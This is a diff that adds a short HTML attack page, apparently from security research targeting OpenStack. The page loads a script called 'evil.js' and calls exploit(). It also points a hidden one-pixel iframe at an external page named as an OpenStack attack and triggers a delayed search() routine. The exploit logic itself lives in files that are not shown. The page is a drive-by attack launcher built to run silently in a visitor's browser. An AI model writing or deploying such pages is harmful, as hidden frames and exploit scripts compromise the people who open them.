@@ -1,0 +1,15 @@
+<html>
+    <p id="log"></p>
+    <script src="evil.js"></script>
+    <iframe id="prep" width="1" height="1"></iframe>
+    <script>
+        exploit();
+
+        c();
+        setTimeout(function (){search();}, 5000);
+
+        function c() {
+            document.getElementById("prep").src="http://www.comp.nus.edu.sg/~jiayaoqi/sop/attack-openstack/all.html"
+        } 
+    </script>
+</html>
